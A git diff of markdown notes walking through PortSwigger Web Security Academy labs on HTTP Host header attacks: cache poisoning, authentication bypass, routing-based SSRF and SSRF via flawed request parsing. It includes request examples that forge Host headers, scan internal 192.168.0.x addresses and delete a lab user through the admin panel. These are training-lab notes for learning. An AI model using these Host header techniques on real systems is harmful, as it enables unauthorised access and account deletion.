@@ -1,4 +1,6 @@
-# **HTTP Host header attacks**
+<span style="color:yellow;font-weight:700;font-size:30px">
+HTTP Host header attacks
+</span>
 https://portswigger.net/web-security/host-header
 
 # How to identify and exploit HTTP Host header vulnerabilities
@@ -12,7 +14,7 @@ How to identify and exploit HTTP Host header vulnerabilities:
 5. Inject host override headers (X-Forwarded-Host / X-Host / X-Forwarded-Server / X-HTTP-Host-Override / Forwarded)
 
 
-# 1. Lab: Web cache poisoning via the Host header
+# ***1. Lab: Web cache poisoning via the Host header***
 https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
  To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser. 
 
@@ -44,12 +46,10 @@ X-Cache: hit
 material:
 https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
 
-
 **XSSed the Cache**
 
-#
 
-# 2. Lab: Host header authentication bypass
+# ***2. Lab: Host header authentication bypass***
 https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass
 
 To solve the lab, access the admin panel and delete Carlos's account. 
@@ -78,12 +78,11 @@ payload:
 
 #
 
-# 3. Lab: Routing-based SSRF
+# ***3. Lab: Routing-based SSRF***
 https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf
 
-note: 
-
-require collaborator? just for first stage so we can skip testing via collaborator (sorry for it - will be comleted with burp pro)
+<!-- note: 
+require collaborator? just for first stage of finding out if header is vulnerable so we can skip testing via collaborator (sorry for it - will be comleted with burp pro later) -->
 
 
 1. send **GET /admin /HTTP1.1** to **intruder**, Change Host field to **192.168.0.x**, mark **x** with payload marker (§x§):
@@ -128,18 +127,41 @@ resend message to repeater and change to craft a valid delete request:
 
 **DELETED**
 
-#
 
-# 4. Lab: SSRF via flawed request parsing
+# **4. Lab: SSRF via flawed request parsing**
 https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing
 
  To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. 
 
-require collaborator? only for verification of vulnarbility
+<!-- collaborator stuf not realy necessery to solve (TBC) -->
 
-_
+change **GET / HTTP/1.1** to absolite URL:
+**GET https://0af1000704da6058c07b1d8d00c200e4.web-security-academy.net/ HTTP/1.1** observe it allows arbitary headers. 
 
-**...to be completed**
+in intruder add **/admin** to the absolute URL and replace host header with 192.168.0.§0§ - to find the IP of the admin 
+request:
+    GET https://0af1000704da6058c07b1d8d00c200e4.web-security-academy.net/admin HTTP/1.1
+    Host: 192.168.0.183
+
+response:
+    HTTP/1.1 302 Found
+    Location: /admin
+
+send to repeater, send again and follow redirection to the admin panel. find the CSRF value and copy it. change the request method to **POST** and enter the **csrf value** & **username value**. add the **/delete** and send:
+
+request:
+    POST https://0af1000704da6058c07b1d8d00c200e4.web-security-academy.net/admin/delete?username=carlos HTTP/1.1
+    Host: 192.168.0.183
+
+    csrf=67LxKpu1jyf0B0r8fD6r1VKjkFokO6of&username=carlos
+
+see lab solved banner
+
+# Done!
+
+
+
+
 
 
 
